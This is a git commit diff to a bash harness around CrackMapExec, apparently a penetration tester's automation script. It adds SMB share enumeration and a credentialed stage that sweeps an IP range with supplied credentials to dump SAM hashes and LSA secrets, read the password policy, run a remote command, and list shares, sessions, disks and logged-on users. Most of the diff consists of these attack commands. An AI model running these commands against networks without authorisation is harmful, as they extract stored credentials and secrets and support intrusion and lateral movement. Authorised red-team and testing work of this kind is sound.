1406bc76cbd80e07a243457c5dd9b3be8d7dab2d
Donovan Jasper <113406828+donovan-jasper@users.noreply.github.com>
2023-11-10 22:00:43 -0800

    Update harness.sh

--- cme/harness.sh
+++ cme/harness.sh
@@ -6,7 +6,7 @@ CME_TIMEOUT=60 # Adjust this value as needed
 # Function to create output file names
 create_output_filenames() {
     local ip_range=$1
-    local safe_ip_range=${ip_range//\//-}
+    local safe_ip_range=$(echo $ip_range | sed 's/[\\/.]/-/g')
     initial_output="${safe_ip_range}-initial-cme.txt"
     cred_output="${safe_ip_range}-cred-cme.txt"
     smb_relay_output="${safe_ip_range}-smb-relay.txt"
@@ -14,6 +14,9 @@ create_output_filenames() {
 
 # Function to clear output files
 clear_output_files() {
+    touch $initial_output
+    touch $cred_output
+    touch $smb_relay_output
     > $initial_output
     > $cred_output
     > $smb_relay_output
@@ -29,10 +32,10 @@ run_smb_relay_scan() {
     fi
 }
 
-# Function to run initial scan across all protocols
+# Function to run initial scan across all protocols with Share Enumeration
 run_initial_scan() {
     local ip_range=$1
-    echo "Running initial scan on all protocols..." | tee -a $initial_output
+    echo "Running initial scan on all protocols with Share Enumeration..." | tee -a $initial_output
     for protocol in smb ftp ldap mssql rdp ssh winrm; do
         echo "Scanning with protocol: $protocol" | tee -a $initial_output
         timeout $CME_TIMEOUT crackmapexec $protocol $ip_range | tee -a $initial_output
@@ -41,17 +44,33 @@ run_initial_scan() {
         fi
         echo "-------------------------------------" | tee -a $initial_output
     done
+    # Share Enumeration
+    echo "Running SMB Share Enumeration..." | tee -a $initial_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -M smb_enumshares | tee -a $initial_output
+    if [ $? -eq 124 ]; then
+        echo "Timeout occurred for SMB Share Enumeration" | tee -a $initial_output
+    fi
 }
 
-# Function to run credentialed SMB scan
+# Function to run credentialed SMB scan with additional modules
 run_cred_scan() {
     local ip_range=$1
     local user=$2
     local pass=$3
-    echo "Running credentialed SMB scan..." | tee -a $cred_output
-    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass | tee -a $cred_output
+    echo "Running credentialed SMB scan with additional modules..." | tee -a $cred_output
+    # Mimikatz, SMB Enumeration, Shares, Sessions, Disks, Loggedon-users, etc.
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --sam | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --lsa | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --pass-pol | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass -x 'whoami /domain'  | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --shares | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --sessions | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --disks | tee -a $cred_output
+    timeout $CME_TIMEOUT crackmapexec smb $ip_range -u $user -p $pass --loggedon-users | tee -a $cred_output
+    # Additional modules as needed
+    # ...
     if [ $? -eq 124 ]; then
-        echo "Timeout occurred for SMB scan" | tee -a $cred_output
+        echo "Timeout occurred for credentialed SMB scan" | tee -a $cred_output
     fi
 }
 
